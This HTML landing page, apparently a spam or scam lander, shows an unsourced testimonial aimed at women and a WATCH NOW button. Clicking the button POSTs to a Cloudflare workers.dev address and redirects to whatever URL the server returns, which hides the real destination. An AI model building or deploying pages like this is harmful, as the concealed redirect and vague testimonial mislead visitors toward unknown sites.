<!DOCTYPE html>
<html lang="fr">
<head>
   
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="accéder au contenu">
    <title>Exclusive Content</title>
    
    <style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        font-family: 'Arial', sans-serif;
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        background-color: #ffffff;
        padding: 20px;
        line-height: 1.5;
    }

    .age-verification-container {
        text-align: center;
        max-width: 420px;
        width: 100%;
        animation: fadeIn 0.5s ease-in-out;
    }

    .verification-title {
        color: #000000;
        font-size: 28px;
        font-weight: 700;
        margin-bottom: 20px;
        line-height: 1.3;
    }

    .verification-instruction {
        color: #333333;
        font-size: 21px;
        font-weight: 600; /* mais forte */
        margin-bottom: 10px;
        line-height: 1.5;
    }

    .quote-author {
        display: block;
        margin-top: 8px;
        font-size: 14px;
        font-weight: 600;
        color: #777777;
    }

    .primary-button {
        background-color: #28a745;
        color: #ffffff;
        border: none;
        padding: 14px 45px;
        font-size: 18px;
        font-weight: bold;
        cursor: pointer;
        border-radius: 8px;
        text-transform: uppercase;
        transition: all 0.3s ease;
        display: inline-block;
        margin-top: 25px;
        text-decoration: none;
    }

    .primary-button:hover {
        background-color: #218838;
        transform: translateY(-2px);
        box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    }

    .cta-button-container {
        margin-top: 10px;
    }

    @keyframes fadeIn {
        from { 
            opacity: 0; 
            transform: translateY(10px); 
        }
        to { 
            opacity: 1; 
            transform: translateY(0); 
        }
    }
</style>
</head>

<body>

<main class="age-verification-container">
    <h1 class="verification-title">Access to Content:</h1>

    <p class="verification-instruction">
        "This has already helped thousands of women."
        <span class="quote-author">– Jennifer A.</span>
    </p>
    
    <div class="cta-button-container"> 
        <a href="#" id="verification-cta-button" class="primary-button">
            WATCH NOW
        </a>
    </div>
</main>

<script>
document.getElementById("verification-cta-button")
  .addEventListener("click", async function(e) {

    e.preventDefault();

    const response = await fetch(
      "https://fra63vitalpeaklink.endersonset11.workers.dev/",
      { method: "POST" }
    );

    if (response.redirected) {
      window.location.href = response.url;
    }
});
</script>

</html>
